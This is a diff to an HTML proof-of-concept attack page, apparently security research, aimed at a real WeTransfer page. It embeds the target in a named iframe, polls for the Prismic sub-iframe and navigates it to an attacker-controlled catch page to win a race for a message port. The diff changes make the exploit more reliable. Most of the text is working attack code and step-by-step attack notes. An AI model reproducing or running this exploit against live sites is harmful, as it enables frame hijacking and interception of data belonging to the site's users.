@@ -42,14 +42,14 @@
 <button onclick="startAttack()">Launch</button>
 <div id="log"></div>
 
-<iframe name="victim" id="victim-frame" src="https://frontsite-nextjs.wetransfer.net/404" width="100%" height="500" style="border: 2px solid #333; border-radius: 4px; margin-top: 10px;"></iframe>
+<iframe name="victim" id="victim-frame" width="100%" height="500" style="border: 2px solid #333; border-radius: 4px; margin-top: 10px; background: #0d1117;"></iframe>
 
 <h3>Attack Flow</h3>
 <pre>
-1. Target page (wetransfer.com/blog) is embedded in a named &lt;iframe name="victim"&gt;
-   — No X-Frame-Options or frame-ancestors headers → framing allowed
-   — Attacker is ANCESTOR → can navigate any descendant frame
-2. window.open(target, "victim") reloads the iframe, returns its WindowProxy
+1. Empty &lt;iframe name="victim"&gt; exists on attacker page (NO pre-loaded src!)
+   — This is critical: iframe must start empty so prismic.js hasn't run yet
+2. window.open(target, "victim") loads target into the named iframe, returns WindowProxy
+   — No X-Frame-Options or frame-ancestors on wetransfer.com → framing allowed
 3. Poll x.frames.length every 10ms — detect Prismic sub-iframe the instant it appears
 4. IMMEDIATELY navigate x.frames[0] to catch page — MUST beat prismic.io load!
    — prismic.js uses {once: true} load handler
@@ -100,14 +100,15 @@ function startAttack() {
   log('Target: ' + TARGET, 'info');
   log('Catch page: ' + CATCH_URL, 'info');
 
-  // Step 1: window.open targets the existing named iframe, reloads it fresh
-  // This triggers a fresh page load → prismic.js runs again → creates NEW Prismic sub-iframe
+  // Step 1: window.open targets the empty named iframe, triggers FIRST load
+  // CRITICAL: iframe must have NO src= so prismic.js hasn't run yet.
+  // If iframe was pre-loaded, setup_port would already be consumed before we can hijack.
   var x = window.open(TARGET, "victim");
   if (!x) {
     log('Failed to get window reference.', 'error');
     return;
   }
-  log('Reloading victim iframe...', 'success');
+  log('Navigating victim iframe to target...', 'success');
 
   // Step 2: IMMEDIATELY poll for the Prismic sub-iframe to appear
   // Race condition: we must navigate frames[0] BEFORE prismic.io content loads
